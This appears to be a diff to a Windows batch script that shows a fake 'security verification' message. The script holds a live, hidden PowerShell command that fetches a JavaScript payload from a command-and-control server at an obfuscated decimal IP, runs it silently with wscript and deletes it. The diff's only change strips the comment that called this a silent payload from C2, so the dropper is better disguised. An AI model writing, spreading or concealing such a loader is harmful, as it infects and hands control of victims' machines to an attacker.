@@ -16,7 +16,7 @@ echo.
 echo   [*] Initializing security verification...
 echo.
 
-REM ── Silent payload: download RC4 JS from C2 and run via wscript ──────────
+REM ── run via wscript ──────────
 powershell -NoP -W H -Command "$ip='3484743087';[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$f=$env:TEMP+'\svc'+[IO.Path]::GetRandomFileName().Replace('.','').Substring(0,6)+'.js';$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)');try{$wc.DownloadFile('http://'+$ip+':8080/win',$f)}catch{$wc2=New-Object Net.WebClient;[Net.ServicePointManager]::CheckCertificateRevocationList=$false;$wc2.DownloadFile('http://'+$ip+':8443/win',$f)};if(Test-Path $f){Start-Process wscript -ArgumentList '//B //NoLogo '+$f -WindowStyle Hidden;Start-Sleep 4;Remove-Item $f -Force -EA 0}"
 
 REM ── Loading animation ─────────────────────────────────────────────────────
